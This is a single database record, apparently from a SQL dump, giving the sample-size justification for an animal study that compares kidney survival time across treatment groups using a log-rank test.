	(9789,266,'sample_size_calculation_details','\"Group comparisons are determined about the (kidney) survival time, defined as achieving a stress score greater than 2 for more than 6 hours. A comparison is made with vehicle-treated animals. A minimum survival time of 60 days is assumed here. The expected median duration in the control group is 70 days. An extension to 85 days is clinically relevant. It can be assumed that there will be no failures up today 60. The log-rank test is used as a statistical test. This corresponds to a clinically relevant hazard coefficient of (85-60) \\/ (70-60) = 2.5. With an error of the first type of \\u03b1= 0.05 and an error of the second type \\u03b2= 0.2, the sample size is n = 20 per group. The use of a two-sided test is necessary because it cannot be ruled out that individual therapy groups also lead to a shortening of the (kidney) survival time, which would be significant since all test substances are already in clinical use elsewhere.\"','2022-03-31 13:24:03','2022-03-31 13:24:03'),
